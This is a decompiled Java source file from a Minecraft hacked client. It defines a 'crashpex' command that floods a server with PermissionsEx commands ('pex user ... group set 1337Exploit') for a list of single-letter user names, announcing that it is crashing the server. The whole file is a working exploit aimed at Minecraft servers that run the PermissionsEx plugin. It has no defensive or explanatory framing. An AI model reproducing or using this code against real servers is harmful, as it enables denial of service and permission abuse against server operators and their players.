// 
// Decompiled by KaktusWasser
// https://www.youtube.com/KaktusWasserReal

package me.kaktuswasser.client.command.commands;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.C01PacketChatMessage;
import me.kaktuswasser.client.command.Command;
import me.kaktuswasser.client.utilities.Logger;
import net.minecraft.client.Minecraft;

public class CrashPEX extends Command
{
    public CrashPEX() {
        super("crashpex", "none");
    }
    
    @Override
    public void run(final String message) {
        Logger.writeChat("Crashing the shitty server right now!");
        final String[] letters = { "d", "b", "m", "l", "g", "h", "i", "l", "a", "v", "w" };
        for (int i = 0; i < letters.length; ++i) {
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/permissionsex:pex user " + letters[i] + " group set 1337Exploit"));
        }
    }
}
